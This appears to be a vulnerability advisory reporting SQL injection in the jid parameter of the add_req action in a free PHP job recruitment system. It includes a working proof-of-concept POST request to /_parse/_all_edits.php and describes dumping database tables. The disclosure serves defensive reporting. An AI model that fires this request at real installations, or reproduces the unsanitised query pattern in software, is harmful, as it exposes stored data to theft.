# job-recruitment-in-php has sql injection vulnerability in add_req action and jid parameter

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
jid parameter

## describe

In jid parameter .An unrestricted SQL injection attack exists in a job-recruitmentsystem. The parameters that can be controlled are as follows:  jid parameter . This function executes the jid parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter value of $POST['jid'] is obtained in add_req action , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![image-20241226010008040](https://github.com/user-attachments/assets/d1c08cb5-5076-4423-b28a-4a74d8142c9d)

## POC

```
POST /_parse/_all_edits.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=etso55q58ionvmrvpetmaf8urt
Upgrade-Insecure-Requests: 1
Priority: u=0, i

jid=1*&degree=2&skillset1=1&action=add_req
```

**Result**

![image-20241226010957780](https://github.com/user-attachments/assets/839a6e83-6917-40ee-b0f6-5f6c08dbdf10)

Get tables

![image-20241213201627253](https://github.com/user-attachments/assets/4314c675-b9dd-4809-9aca-eb525b3e3326)

**Discover**

西安电子科技大学： 李腾，谢亚轩，刘芮彤
